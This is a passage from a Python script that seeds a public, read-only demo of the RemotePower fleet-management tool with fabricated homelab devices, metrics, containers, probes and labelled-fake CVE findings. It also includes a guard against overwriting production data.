#!/usr/bin/env python3
"""seed-demo-data.py — populate /var/lib/remotepower/ with a fake homelab.

For the public demo sandbox at e.g. demoremote.tvipper.com. Pair this
with ``RP_READ_ONLY=1`` in the systemd unit / fastcgi config so visitors
can browse but not modify.

Run as the CGI user so file ownership stays correct:

    sudo -u www-data python3 packaging/seed-demo-data.py --apply

Without --apply, prints what it would write. Re-running is idempotent:
the seed is deterministic (no random IDs except where the schema
requires them), so the same input produces the same output. Old state
in the data directory is overwritten.

The "homelab" is a deliberately realistic small-fleet setup: hypervisor,
NAS, firewall, DNS, reverse proxy, media server, git, monitoring,
plus a few agentless network devices. Every metric, package list, and
service status is fabricated. Hostnames use the ``.lab`` TLD which is
unallocated and won't collide with anything real.

Schedule a cron entry to re-run this every 30 minutes if you want
``last_seen`` timestamps to keep looking fresh:

    */30 * * * * www-data python3 /opt/remotepower/packaging/seed-demo-data.py --apply --quiet
"""

import argparse
import base64
import datetime
import hashlib
import json
import os
import random
import secrets
import shutil
import sys
import time
from pathlib import Path


# ─── Configuration ────────────────────────────────────────────────────────────

# IMPORTANT: the default is the DEMO data dir, never production. Seeding writes
# fake data; pointing it at the live /var/lib/remotepower would clobber a real
# fleet. The guard below (_guard_demo_target) refuses to --apply into a dir that
# looks like production (real accounts present) or any non-empty dir that isn't
# explicitly marked as a demo dir.
DEFAULT_DATA_DIR = Path('/var/lib/remotepower-demo')

# A dir is treated as a sanctioned demo target if it contains this marker file.
# The script drops it automatically after a successful seed of an empty dir, so
# cron re-seeds keep working; install-demo.sh can also pre-create it.
DEMO_MARKER = '.rp-demo-marker'

# Canonical production data dir(s) — never seed these.
PROTECTED_DATA_DIRS = {'/var/lib/remotepower'}

# Accounts the seed itself creates — their presence does NOT make a dir "real".
_DEMO_ACCOUNTS = {'demo', 'alice', 'bob'}


def _guard_demo_target(target, override=False):
    """Decide whether it is safe to --apply (write fake data) into `target`.

    Returns (ok: bool, reason: str). Blocks, in order:
      1. A canonical production path (e.g. /var/lib/remotepower).
      2. A dir whose users.json holds any non-demo account (real fleet).
      3. A non-empty dir with no .rp-demo-marker (ambiguous — refuse).
    `override=True` (undocumented flag) bypasses 1 & 3 but NEVER 2.
    """
    try:
        resolved = str(target.resolve())
    except Exception:
        resolved = str(target)

    # 2. Real accounts present → always block, even with override or a marker.
    # A never-used default admin (must_change_password=True) does NOT count:
    # the app auto-creates exactly that the first time the demo vhost serves a
    # request, and refusing to seed because of it would make a fresh demo
    # instance un-seedable. A *real* admin (password changed, so no
    # must_change_password flag) still blocks — that's the production guard.
    users = target / 'users.json'
    if users.exists():
        try:
            udata = json.loads(users.read_text() or '{}')
            real = sorted(
                n for n, u in (udata or {}).items()
                if n not in _DEMO_ACCOUNTS
                and not (isinstance(u, dict) and u.get('must_change_password'))
            )
            if real:
                return (False,
                        f"{users} contains real (non-demo) account(s): "
                        f"{', '.join(real)}. This looks like a PRODUCTION data "
                        f"dir — refusing to overwrite it with fake data.")
        except (ValueError, OSError):
            return (False, f"{users} exists but is unreadable — refusing to "
                           f"risk overwriting a real data dir.")

    if override:
        return (True, 'override')

    # 1. Canonical production path.
    if resolved in PROTECTED_DATA_DIRS:
        return (False,
                f"{resolved} is the production data dir. Seed the demo dir "
                f"instead (default {DEFAULT_DATA_DIR}), or pass --data-dir.")

    # 3. Non-empty, unmarked dir.
    has_marker = (target / DEMO_MARKER).exists()
    existing = list(target.glob('*.json')) if target.exists() else []
    if existing and not has_marker:
        return (False,
                f"{resolved} is not empty and has no {DEMO_MARKER}. If this is "
                f"really your demo dir, run:  touch {target}/{DEMO_MARKER}  and "
                f"re-run. Otherwise pass --data-dir to point at the demo dir.")

    return (True, 'ok')

# Devices are listed in dependency order — agentless network gear first
# so the agented hosts can reference them in connected_to.
FAKE_DEVICES = [
    # Agentless — switches, APs
    {'id': 'sw01', 'name': 'switch-core',  'os': 'JunOS',   'ip': '10.0.0.1',  'mac': '02:00:5e:00:01:01', 'group': 'network', 'tags': ['switch', 'core'],  'agentless': True, 'connected_to': []},
    {'id': 'sw02', 'name': 'switch-rack',  'os': 'UniFi',   'ip': '10.0.0.2',  'mac': '02:00:5e:00:01:02', 'group': 'network', 'tags': ['switch'],          'agentless': True, 'connected_to': ['sw01']},
    {'id': 'ap01', 'name': 'ap-living',    'os': 'UniFi',   'ip': '10.0.0.10', 'mac': '02:00:5e:00:01:10', 'group': 'network', 'tags': ['ap', 'wifi'],      'agentless': True, 'connected_to': ['sw01']},
    {'id': 'ap02', 'name': 'ap-office',    'os': 'UniFi',   'ip': '10.0.0.11', 'mac': '02:00:5e:00:01:11', 'group': 'network', 'tags': ['ap', 'wifi'],      'agentless': True, 'connected_to': ['sw01']},

    # Agented hosts
    {'id': 'pmx01', 'name': 'proxmox.lab',       'os': 'Debian 12',           'ip': '10.0.1.10', 'mac': '52:54:00:11:01:10', 'group': 'infra',   'tags': ['hypervisor', 'critical'],   'agentless': False, 'connected_to': ['sw02']},
    {'id': 'tnas',  'name': 'truenas.lab',       'os': 'Debian 12',           'ip': '10.0.1.20', 'mac': '52:54:00:11:01:20', 'group': 'storage', 'tags': ['nas', 'critical', 'backup'], 'agentless': False, 'connected_to': ['sw02']},
    {'id': 'fw01',  'name': 'opnsense.lab',      'os': 'Debian 12',           'ip': '10.0.0.254','mac': '52:54:00:11:00:fe', 'group': 'network', 'tags': ['firewall', 'critical'],     'agentless': False, 'connected_to': ['sw01']},
    {'id': 'pi1',   'name': 'pihole.lab',        'os': 'Raspberry Pi OS',     'ip': '10.0.2.10', 'mac': '52:54:00:11:02:10', 'group': 'services','tags': ['dns', 'pi'],                'agentless': False, 'connected_to': ['sw02']},
    {'id': 'ng01',  'name': 'nginx.lab',         'os': 'Ubuntu 24.04 LTS',    'ip': '10.0.2.20', 'mac': '52:54:00:11:02:20', 'group': 'services','tags': ['web', 'proxy'],             'agentless': False, 'connected_to': ['sw02']},
    {'id': 'jf01',  'name': 'jellyfin.lab',      'os': 'Ubuntu 24.04 LTS',    'ip': '10.0.2.30', 'mac': '52:54:00:11:02:30', 'group': 'media',   'tags': ['media', 'streaming'],       'agentless': False, 'connected_to': ['sw02']},
    {'id': 'gt01',  'name': 'gitea.lab',         'os': 'Debian 12',           'ip': '10.0.2.40', 'mac': '52:54:00:11:02:40', 'group': 'services','tags': ['git', 'dev'],               'agentless': False, 'connected_to': ['sw02']},
    {'id': 'ha01',  'name': 'home-assistant.lab','os': 'Alpine 3.20',         'ip': '10.0.2.50', 'mac': '52:54:00:11:02:50', 'group': 'services','tags': ['home', 'iot'],              'agentless': False, 'connected_to': ['sw02']},
    {'id': 'nc01',  'name': 'nextcloud.lab',     'os': 'Ubuntu 24.04 LTS',    'ip': '10.0.2.60', 'mac': '52:54:00:11:02:60', 'group': 'services','tags': ['files', 'cloud'],           'agentless': False, 'connected_to': ['sw02']},
    {'id': 'vw01',  'name': 'vaultwarden.lab',   'os': 'Alpine 3.20',         'ip': '10.0.2.70', 'mac': '52:54:00:11:02:70', 'group': 'services','tags': ['secrets'],                  'agentless': False, 'connected_to': ['sw02']},
    {'id': 'pr01',  'name': 'prometheus.lab',    'os': 'Debian 12',           'ip': '10.0.2.80', 'mac': '52:54:00:11:02:80', 'group': 'monitoring','tags': ['metrics', 'grafana'],     'agentless': False, 'connected_to': ['sw02']},
    {'id': 'bk01',  'name': 'backup.lab',        'os': 'Debian 12',           'ip': '10.0.2.90', 'mac': '52:54:00:11:02:90', 'group': 'storage', 'tags': ['backup', 'restic'],         'agentless': False, 'connected_to': ['sw02']},
]


def now() -> int:
    return int(time.time())


def _seeded_random(*key) -> random.Random:
    """Per-device deterministic randomness — same device → same metrics
    every run, so the demo doesn't visibly thrash on each cron tick.
    But ``last_seen`` and timestamps still update from real ``time.time()``,
    so freshness looks correct."""
    h = hashlib.sha256(repr(key).encode()).hexdigest()
    return random.Random(int(h[:16], 16))


def _stable_id(*key, length=8) -> str:
    """A stable token-shaped id derived from ``key`` — shaped like the
    ``secrets.token_urlsafe(8)`` ids the API mints, but deterministic so
    re-running the seeder doesn't churn ids on every cron tick.

    api.py mints these with ``secrets.token_urlsafe(8)``; for demo data we
    want idempotency, so we hash the key into the same alphabet instead."""
    alphabet = ('abcdefghijklmnopqrstuvwxyz'
                'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_')
    h = hashlib.sha256(('id|' + repr(key)).encode()).digest()
    return ''.join(alphabet[b % len(alphabet)] for b in h[:length])


def _stable_hex(*key, nbytes=6) -> str:
    """Stable hex id (deterministic analogue of ``os.urandom(n).hex()``)."""
    h = hashlib.sha256(('hex|' + repr(key)).encode()).hexdigest()
    return h[:nbytes * 2]


def _iso_in_days(days: int) -> str:
    """ISO YYYY-MM-DD date `days` from today (negative = past)."""
    d = datetime.date.today() + datetime.timedelta(days=days)
    return d.isoformat()


# ─── Sites (v3.5.0) ─────────────────────────────────────────────────────────
# A small hosting company runs three sites. IDs are stable (deterministic)
# so device→site links stay valid across re-seeds. build_sites() emits the
# site records; SITE_OF maps a device id to its site for build_devices().

SITE_HQ   = _stable_id('site', 'hq-copenhagen')
SITE_DC   = _stable_id('site', 'dc-frankfurt')
SITE_EDGE = _stable_id('site', 'edge-london')

SITE_OF = {
    # Frankfurt DC — the heavy iron lives here.
    'pmx01': SITE_DC, 'tnas': SITE_DC, 'bk01': SITE_DC, 'pr01': SITE_DC,
    'sw02': SITE_DC,
    # Copenhagen HQ — office network + internal services.
    'fw01': SITE_HQ, 'sw01': SITE_HQ, 'ap01': SITE_HQ, 'ap02': SITE_HQ,
    'pi1': SITE_HQ, 'gt01': SITE_HQ, 'ha01': SITE_HQ, 'vw01': SITE_HQ,
    # London edge — public-facing web tier.
    'ng01': SITE_EDGE, 'jf01': SITE_EDGE, 'nc01': SITE_EDGE,
}


# ─── State builders ───────────────────────────────────────────────────────────


def build_users() -> dict:
    """One demo user, viewer role, password 'demo'.

    Anyone reaching the demo URL can log in. Viewer role is harmless —
    the read-only mode env var blocks mutations regardless of role, but
    starting with viewer keeps "what an admin would see vs not see"
    realistic for visitors.

    bcrypt hash for 'demo' — generated once and frozen here so the seed
    script is deterministic. (Anyone reading this source can derive the
    hash, but that doesn't matter; the demo is intentionally public.)
    """
    # bcrypt('demo') — pre-computed once and frozen so the seed is
    # deterministic. Shared by all demo accounts (the demo is intentionally
    # public; read-only mode blocks mutations regardless of role).
    demo_hash = '$2b$12$xl8rH.3CU0lHsH631ECiq.GKw8lff3GEaqKSOt5YCTm9pxunnG7RW'
    return {
        'demo': {
            'role': 'viewer',
            'password_hash': demo_hash,
            'totp_secret':   '',
            'created_at':    now() - 86400 * 30,
        },
        # v3.7.0 maker-checker needs two distinct admins so the approve flow
        # demos: self-approval is blocked, so alice's request must be approved
        # by bob (or vice-versa). Both share the 'demo' password.
        'alice': {
            'role': 'admin',
            'password_hash': demo_hash,
            'totp_secret':   '',
            'created_at':    now() - 86400 * 120,
        },
        'bob': {
            'role': 'admin',
            'password_hash': demo_hash,
            'totp_secret':   '',
            'created_at':    now() - 86400 * 90,
        },
    }


def _demo_enrich_sysinfo(dev, rng, si):
    """v3.11–v3.13 device-drawer / Exposure / Storage demo data, added in place.

    Populates the signals that drive the newer per-device cards so the demo
    actually shows them: access watch (recent logins), systemd timers, listening
    ports with world/lan/local scope, per-host storage/RAID health, and the
    firewall posture + drift fingerprint."""
    tags = dev.get('tags') or []
    # ── access watch: recent logins + distinct source IPs ──
    _users = rng.sample(['jmo', 'root', 'deploy', 'ansible', 'admin'],
                        k=rng.randint(1, 3))
    _srcs = rng.sample(['192.168.1.50', '10.0.0.12', '213.174.78.189',
                        '95.166.252.182', '172.19.0.1', '192.168.2.21'],
                       k=rng.randint(1, 4))
    si['auth'] = {
        'recent_logins': [{'user': rng.choice(_users), 'source': rng.choice(_srcs)}
                          for _ in range(rng.randint(2, 8))],
        'sources': _srcs,
    }
    # ── systemd timers (some failed on a couple of hosts) ──
    _timers = [('apt-daily.timer', 'apt-daily.service'),
               ('logrotate.timer', 'logrotate.service'),
               ('fstrim.timer', 'fstrim.service'),
               ('certbot.timer', 'certbot.service'),
               ('backup-nightly.timer', 'backup-nightly.service')]
    si['timers'] = [{'unit': u, 'activates': a,
                     'failed': (dev['id'] in ('jf01', 'nc01') and u == 'backup-nightly.timer')}
                    for u, a in rng.sample(_timers, k=rng.randint(3, len(_timers)))]
    # ── listening ports with bind address + scope (Exposure) ──
    _catalog = [('tcp', 22, 'sshd', '0.0.0.0', 'world'),
                ('tcp', 443, 'nginx', '0.0.0.0', 'world'),
                ('tcp', 80, 'nginx', '0.0.0.0', 'world'),
                ('tcp', 53, 'systemd-resolve', '127.0.0.53', 'local'),
                ('udp', 53, 'AdGuardHome', '10.0.0.2', 'lan'),
                ('tcp', 3306, 'mysqld', '127.0.0.1', 'local'),
                ('tcp', 8006, 'pveproxy', '0.0.0.0', 'world'),
                ('tcp', 9090, 'prometheus', '10.0.0.5', 'lan'),
                ('tcp', 5432, 'postgres', '127.0.0.1', 'local')]
    si['listening_ports'] = [{'proto': p, 'port': port, 'process': proc,
                              'addr': addr, 'scope': scope}
                             for p, port, proc, addr, scope in
                             rng.sample(_catalog, k=rng.randint(4, len(_catalog)))]
    # ── per-host storage / RAID health (storage / nas / backup hosts) ──
    if any(t in tags for t in ('storage', 'nas', 'backup')):
        si['storage_health'] = [
            {'name': 'tank', 'kind': 'zfs',
             'state': rng.choice(['ONLINE', 'ONLINE', 'DEGRADED']),
             'capacity': rng.randint(55, 92),
             'scrub': rng.choice(['scrub repaired 0B', 'none requested',
                                  'scrub in progress'])},
            {'name': 'md0', 'kind': 'mdadm',
             'state': rng.choice(['active', 'active', 'degraded']),
             'capacity': rng.randint(40, 80), 'scrub': ''},
        ]
    # ── host firewall posture + drift fingerprint ──
    _backend = rng.choice(['nftables', 'iptables', 'ufw'])
    _rules = rng.randint(0, 120)
    _active = _rules > 0
    si['firewall'] = {
        'active': _active,
        'backends': [{'name': _backend, 'present': True, 'active': _active,
                      'rules': _rules, 'policy': 'DROP' if _active else 'ACCEPT'}],
    }
    si['firewall_fp'] = {'backend': _backend, 'rules': _rules,
                         'fp': hashlib.sha256(
                             f"{dev['id']}|fw".encode()).hexdigest()[:16]}


# v2.6.0/v3.13.0: sample desired host configs for the Host Configuration modal
# + fleet export demo. Keyed by device id; SSH keys are placeholders.
_DEMO_HOST_CONFIG = {
    'ng01': {
        'services': ['nginx.service', 'fail2ban.service'],
        'hosts': '127.0.0.1 localhost\n10.0.0.10 ng01 nginx.lab\n10.0.0.2 adguard.lab',
        'motd': 'Authorized access only — nginx reverse proxy (managed by RemotePower).',
        'resolv_conf': 'nameserver 10.0.0.2\nsearch lab',
    },
    'nc01': {
        'services': ['apache2.service', 'php8.2-fpm.service', 'mariadb.service'],
        'hosts': '127.0.0.1 localhost\n10.0.0.13 nc01 nextcloud.lab',
        'motd': 'Nextcloud — data on /mnt/share (CIFS). Managed by RemotePower.',
        'cron': '30 2 * * * mysqldump --single-transaction nextcloud | zstd -o /mnt/share/db/nc.sql.zst',
    },
}


def build_devices() -> dict:
    """Build devices.json with sysinfo, last_seen, and per-mount disks."""
    out = {}
    seen_offset_max = 90  # most devices last seen 0–90s ago, all "online"
    for dev in FAKE_DEVICES:
        rng = _seeded_random(dev['id'], 'sysinfo')
        last_seen = now() - rng.randint(5, seen_offset_max)
        rec = {
            'name':        dev['name'],
            'token':       'demo-token-' + dev['id'],   # never used (demo blocks heartbeats)
            'os':          dev['os'],
            'ip':          dev['ip'],
            'mac':         dev['mac'],
            'group':       dev['group'],
            'tags':        dev['tags'],
            'enrolled_at': now() - 86400 * rng.randint(30, 365),
            'last_seen':   last_seen,
            'agentless':   dev['agentless'],
            'connected_to': dev.get('connected_to', []),
            # v3.0.2: most devices are monitored; bk01 (backup.lab) is
            # intentionally unmonitored to showcase how alerts get
            # suppressed for a device that's mid-migration / decommissioning.
            # This is also what makes the dashboard tile counts diverge
            # from the raw device list.
            'monitored':   dev.get('monitored', dev['id'] != 'bk01'),
            'poll_interval': 60,
            'version':     '3.13.0' if not dev['agentless'] else None,
            'hostname':    dev['name'],
            # v3.5.0: site assignment (most devices belong to one of three sites)
            'site':        SITE_OF.get(dev['id'], ''),
        }
        # v3.8.0: last-boot reason for a couple of hosts so the device drawer
        # shows why they rebooted recently.
        boot_reasons = {
            'pmx01': ('kernel upgrade', now() - 3600 * 3),
            'ng01':  ('self-update',    now() - 86400 * 2),
        }
        if dev['id'] in boot_reasons:
            rec['last_boot_reason'], rec['last_boot_reason_at'] = boot_reasons[dev['id']]
        if not dev['agentless']:
            # Agented hosts get a believable sysinfo block — different
            # devices stress different resources to exercise the alert
            # thresholds in the UI. Per-device randomness is seeded so
            # the same device always reports the same numbers.
            cpu_count = rng.choice([2, 2, 4, 4, 4, 8, 8, 16])
            mem_total_gb = rng.choice([4, 8, 8, 16, 16, 32, 64])
            stress = rng.random()    # 0..1, used to vary which device looks "stressed"
            if stress > 0.85:
                # ~15% of devices are in some kind of warning state
                mem_pct = rng.uniform(86, 96)
                load_per_cpu = rng.uniform(1.6, 2.8)
            elif stress > 0.65:
                mem_pct = rng.uniform(60, 84)
                load_per_cpu = rng.uniform(0.4, 1.2)
            else:
                mem_pct = rng.uniform(20, 55)
                load_per_cpu = rng.uniform(0.05, 0.5)

            mounts = [{'path': '/', 'percent': round(rng.uniform(15, 78), 1),
                       'used_gb': 0, 'total_gb': rng.choice([20, 40, 60, 100])}]
            # Add /var on some devices, and a giant /backup on the storage hosts
            if 'storage' in dev['tags'] or 'nas' in dev['tags']:
                mounts.append({'path': '/mnt/data', 'percent': round(rng.uniform(60, 92), 1),
                               'used_gb': 0, 'total_gb': rng.choice([2000, 4000, 8000])})
            elif 'backup' in dev['tags']:
                mounts.append({'path': '/mnt/backup', 'percent': round(rng.uniform(70, 95), 1),
                               'used_gb': 0, 'total_gb': rng.choice([4000, 8000])})
            else:
                mounts.append({'path': '/var', 'percent': round(rng.uniform(35, 72), 1),
                               'used_gb': 0, 'total_gb': rng.choice([10, 20, 40])})
            # v3.13.0: a CIFS/NFS network share on media/web/app hosts, so the
            # demo shows the "net" badge (drawer + Monitor), the per-mount Trends
            # series and the disk-fill Forecast for a network mount.
            if 'media' in dev['tags'] or 'web' in dev['tags'] or 'cloud' in dev['tags']:
                _share = rng.choice(['//192.168.2.100/data', '//truenas.lab/media',
                                     '10.0.0.20:/export/backups'])
                mounts.append({'path': '/mnt/share',
                               'percent': round(rng.uniform(48, 88), 1),
                               'used_gb': 0, 'total_gb': rng.choice([2000, 8000, 18000]),
                               'fstype': 'cifs' if _share.startswith('//') else 'nfs4',
                               'network': True, 'server': _share})
            # Compute used_gb from percent × total_gb so the numbers are self-consistent
            for m in mounts:
                m['used_gb'] = round(m['total_gb'] * m['percent'] / 100, 1)

            _disk_total = round(sum(m['total_gb'] for m in mounts
                                    if not m.get('network')), 1)
            rec['sysinfo'] = {
                'cpu_count':    cpu_count,
                # v3.13.0: CMDB Hardware panel reads cpu/mem_total_mb/disk_total_gb/kernel
                'cpu':          rng.choice([
                                    'Intel(R) Xeon(R) E-2336 @ 2.90GHz',
                                    'AMD Ryzen 7 5800X 8-Core', '13th Gen Intel Core i5-13500',
                                    'AMD EPYC 7302P 16-Core', 'Intel(R) Core(TM) i7-10700']),
                'mem_total_gb': mem_total_gb,
                'mem_total_mb': mem_total_gb * 1024,
                'disk_total_gb': _disk_total,
                'mem_percent':  round(mem_pct, 1),
                'swap_percent': round(rng.uniform(0, 8), 1),
                'loadavg_1m':   round(load_per_cpu * cpu_count, 2),
                'loadavg_5m':   round(load_per_cpu * cpu_count * rng.uniform(0.85, 1.05), 2),
                'loadavg_15m':  round(load_per_cpu * cpu_count * rng.uniform(0.7, 1.0), 2),
                'mounts':       mounts,
                'kernel':       rng.choice(['6.1.0-21-amd64', '6.8.0-31-generic', '6.6.32-current']),
                'uptime_s':     rng.randint(86400, 86400 * 180),
                'packages':     {'upgradable': rng.choices([0, 0, 0, 1, 3, 7, 12, 23], k=1)[0]},
            }
            # v3.11–v3.13: device-drawer cards — access watch (recent logins),
            # systemd timers, listening ports w/ scope (Exposure), per-host
            # storage/RAID health, and the firewall posture + fingerprint.
            _demo_enrich_sysinfo(dev, rng, rec['sysinfo'])
            # v3.8.0: failed systemd units (drives the failed_units attention
            # item + AI-investigate playbook) and logged-in users (drawer
            # System Info). A couple of hosts have failures to demo the signal.
            _FAILED_UNITS = {
                'jf01': ['jellyfin.service', 'plex-update.timer'],
                'nc01': ['backup-nightly.service'],
            }
            if dev['id'] in _FAILED_UNITS:
                rec['sysinfo']['failed_units'] = _FAILED_UNITS[dev['id']]
            rec['sysinfo']['logged_in'] = rng.choice([
                [], ['root'], ['jmo'], ['root', 'jmo'], ['deploy'],
            ])
            # Add a few common services
            rec['services'] = build_device_services(dev, rng)

            # v2.6.0/v3.13.0: a desired host config on a couple of hosts so the
            # Host Configuration modal and the fleet "Export all host configs"
            # action have content. Audit-only (apply disabled) — demo is read-only.
            if dev['id'] in _DEMO_HOST_CONFIG:
                rec['host_config'] = {
                    'desired': _DEMO_HOST_CONFIG[dev['id']],
                    'desired_at': last_seen - 86400 * 3,
                    'apply_enabled': False, 'enforce': False,
                    'drift': {},
                }

            # v2.2.0+: compose_projects for demo realism. Only devices that
            # have docker in their tags (media, web, proxy, git, cloud,
            # metrics, monitoring) get any; the rest report none. Project
            # names + paths mirror the kind of layout a homelab actually
            # has on disk.
            compose = _build_demo_compose_projects(dev, rng)
            if compose:
                rec['compose_projects'] = compose
                rec['compose_projects_ts'] = last_seen

        out[dev['id']] = rec
    return out


_DEMO_COMPOSE_BY_TAG = {
    'media':       [('jellyfin',   '/opt/stacks/jellyfin'),
                    ('sonarr',     '/opt/stacks/arr'),
                    ('radarr',     '/opt/stacks/arr/radarr')],
    'web':         [('caddy',      '/srv/caddy'),
                    ('wizarr',     '/home/jmo/wizarr')],
    'proxy':       [('caddy',      '/srv/caddy'),
                    ('authelia',   '/srv/authelia')],
    'git':         [('gitea',      '/opt/gitea')],
    'cloud':       [('nextcloud',  '/opt/nextcloud'),
                    ('collabora',  '/opt/collabora')],
    'metrics':     [('prometheus', '/opt/monitoring/prometheus'),
                    ('grafana',    '/opt/monitoring/grafana')],
    'home':        [('homeassistant', '/opt/homeassistant'),
                    ('zigbee2mqtt',   '/opt/zigbee2mqtt')],
}


def _build_demo_compose_projects(dev, rng):
    """Return a list of {path, dir, name, mtime} compose entries for the
    device based on its tags. Empty list = device has docker but no
    compose projects (or doesn't have docker at all)."""
    out = []
    seen_dirs = set()
    for tag in dev.get('tags', []):
        for name, base_dir in _DEMO_COMPOSE_BY_TAG.get(tag, []):
            if base_dir in seen_dirs:
                continue
            seen_dirs.add(base_dir)
            out.append({
                'path':  base_dir + '/docker-compose.yml',
                'dir':   base_dir,
                'name':  name,
                'mtime': now() - rng.randint(86400, 86400 * 60),
            })
    return out[:8]


def build_device_services(dev, rng) -> dict:
    """Per-device watched services. Tag-driven so a 'web' device gets nginx."""
    svcs = {'sshd.service': 'active'}    # everyone has ssh
    if 'firewall' in dev['tags']:
        svcs.update({'nftables.service': 'active', 'unbound.service': 'active'})
    if 'dns' in dev['tags']:
        svcs.update({'pihole-FTL.service': 'active', 'lighttpd.service': 'active'})
    if 'web' in dev['tags'] or 'proxy' in dev['tags']:
        svcs.update({'nginx.service': 'active'})
    if 'media' in dev['tags']:
        # one device deliberately has a failing service, so the dashboard
        # has something interesting to show
        svcs.update({'jellyfin.service': rng.choice(['active', 'active', 'failed'])})
    if 'git' in dev['tags']:
        svcs.update({'gitea.service': 'active'})
    if 'home' in dev['tags']:
        svcs.update({'home-assistant.service': 'active'})
    if 'cloud' in dev['tags']:
        svcs.update({'apache2.service': 'active', 'php8.2-fpm.service': 'active'})
    if 'metrics' in dev['tags']:
        svcs.update({'prometheus.service': 'active', 'grafana-server.service': 'active'})
    if 'backup' in dev['tags']:
        svcs.update({'restic-backup.timer': 'active'})
    if 'hypervisor' in dev['tags']:
        svcs.update({'pve-cluster.service': 'active', 'pveproxy.service': 'active'})
    if 'nas' in dev['tags']:
        svcs.update({'smbd.service': 'active', 'nfs-server.service': 'active'})
    return svcs


def build_metrics() -> dict:
    """Per-device 60-point metric history (1 hour at 1-minute resolution).

    Smooth curves with a slow drift so the sparkline charts look natural.
    """
    out = {}
    for dev in FAKE_DEVICES:
        if dev['agentless']:
            continue
        rng = _seeded_random(dev['id'], 'metrics')
        baseline_cpu = rng.uniform(8, 35)
        baseline_mem = rng.uniform(25, 70)
        baseline_disk = rng.uniform(30, 75)
        points = []
        for i in range(60):
            ts = now() - (59 - i) * 60
            points.append({
                'ts': ts,
                'cpu':  max(0, min(100, baseline_cpu + rng.gauss(0, 4))),
                'mem':  max(0, min(100, baseline_mem + rng.gauss(0, 1.5))),
                'disk': max(0, min(100, baseline_disk + rng.gauss(0, 0.3))),
            })
        out[dev['id']] = points
    return out


def build_containers() -> dict:
    """A handful of docker containers per services-flavoured device."""
    out = {}
    for dev in FAKE_DEVICES:
        if dev['agentless']:
            continue
        containers = []
        rng = _seeded_random(dev['id'], 'containers')

        catalogue = {
            'nginx.lab':         [('nginx', 'nginx:1.27', 'running', 0)],
            'jellyfin.lab':      [('jellyfin', 'jellyfin/jellyfin:latest', 'running', 0)],
            'gitea.lab':         [('gitea', 'gitea/gitea:1.22', 'running', 0),
                                  ('gitea-db', 'postgres:16', 'running', 0)],
            'nextcloud.lab':     [('nextcloud', 'nextcloud:30-apache', 'running', 0),
                                  ('nextcloud-db', 'mariadb:11', 'running', 0),
                                  ('nextcloud-cache', 'redis:7', 'running', 1)],
            'vaultwarden.lab':   [('vaultwarden', 'vaultwarden/server:latest', 'running', 0)],
            'home-assistant.lab':[('homeassistant', 'homeassistant/home-assistant:stable', 'running', 0),
                                  ('mosquitto', 'eclipse-mosquitto:2', 'running', 0),
                                  ('zwave-js', 'zwavejs/zwave-js-ui:latest', 'running', 0)],
            'pihole.lab':        [('pihole', 'pihole/pihole:latest', 'running', 0)],
            'prometheus.lab':    [('prometheus', 'prom/prometheus:latest', 'running', 0),
                                  ('grafana', 'grafana/grafana:latest', 'running', 0),
                                  ('node-exporter', 'prom/node-exporter:latest', 'running', 0)],
        }
        items = catalogue.get(dev['name'], [])
        for (cname, image, status, restarts) in items:
            containers.append({
                'name':     cname,
                'image':    image,
                'status':   status,
                'restarts': restarts,
                'started':  now() - rng.randint(86400, 86400 * 30),
                'ports':    [],
                'runtime':  'docker',
            })

        if containers:
            out[dev['id']] = {
                'containers':   containers,
                'last_updated': now() - rng.randint(30, 200),
            }
    return out


def build_monitor_history() -> dict:
    """A few external probes — DNS, status pages, gateway."""
    targets = [
        {'id': 'gw',     'label': 'Gateway',       'type': 'ping', 'target': '10.0.0.1'},
        {'id': 'g8',     'label': 'Google DNS',    'type': 'ping', 'target': '8.8.8.8'},
        {'id': 'cf',     'label': 'Cloudflare',    'type': 'ping', 'target': '1.1.1.1'},
        {'id': 'gh-api', 'label': 'GitHub API',    'type': 'http', 'target': 'https://api.github.com'},
        {'id': 'isp',    'label': 'ISP status',    'type': 'http', 'target': 'https://www.cloudflarestatus.com'},
        {'id': 'ssh',    'label': 'External SSH',  'type': 'tcp',  'target': '203.0.113.5:22'},
    ]
    out = {'targets': targets, 'history': {}}
    for t in targets:
        rng = _seeded_random(t['id'], 'monitor')
        # Most checks succeeded; sprinkle a few failures
        history = []
        for i in range(50):
            ts = now() - (49 - i) * 300
            ok = rng.random() > (0.04 if t['id'] != 'isp' else 0.18)
            history.append({'ts': ts, 'ok': ok,
                            'detail': 'ok' if ok else rng.choice(['timeout', 'unreachable', 'connection refused'])})
        out['history'][t['id']] = history
    return out


def build_cve_findings() -> dict:
    """A small but realistic batch of CVE findings.

    Mix of severities + affected packages; references real CVE IDs but
    these are paired with fake versions so any cross-check would fail
    safely (the demo isn't claiming these are real findings on real hosts).
    """
    # (vuln_id, severity, package, installed, fixed, summary, published)
    # Severity is lowercase — cve_scanner.summarize_findings buckets by the
    # literal string into {critical,high,medium,low}.
    fake_cves = [
        ('CVE-2024-12345', 'high',     'openssh-server', '8.9p1-3ubuntu0.1', '8.9p1-3ubuntu0.10', 'Memory disclosure in pre-auth path.',        '2024-05-14'),
        ('CVE-2024-23456', 'critical', 'libcurl4',       '7.81.0-1ubuntu1.16','7.81.0-1ubuntu1.20','Heap overflow in URL parsing.',             '2024-03-27'),
        ('CVE-2024-34567', 'medium',   'sudo',           '1.9.9-1ubuntu2.4', '1.9.9-1ubuntu2.5',  'Privilege escalation via env var.',          '2024-06-02'),
        ('CVE-2024-45678', 'low',      'curl',           '7.81.0-1ubuntu1.16','7.81.0-1ubuntu1.20','Information leak in cookie handling.',       '2024-04-18'),
        ('CVE-2023-99999', 'high',     'nginx',          '1.18.0-6ubuntu14.4','1.18.0-6ubuntu14.5','Off-by-one in HTTP/2 frame parsing.',        '2023-11-09'),
    ]
    rng = random.Random(42)
    # Canonical on-disk shape is {dev_id: {findings: [...], scanned_at: ts}} —
    # the same shape a real scan writes, so /api/cve/findings + the device drawer
    # both read it (and the KEV/EPSS overlay in kev_epss.json matches by vuln_id).
    out = {}
    targets = [d['id'] for d in FAKE_DEVICES if not d['agentless']]
    for dev_id in targets:
        n = rng.choices([0, 0, 1, 2, 3, 5], k=1)[0]
        if n == 0:
            continue
        chosen = rng.sample(fake_cves, min(n, len(fake_cves)))
        out[dev_id] = {
            'scanned_at': now() - 3600 * 6,
            'findings': [
                {'vuln_id': c[0], 'severity': c[1], 'package': c[2],
                 'version': c[3], 'fixed_version': c[4], 'summary': c[5],
                 'published': c[6], 'aliases': [],
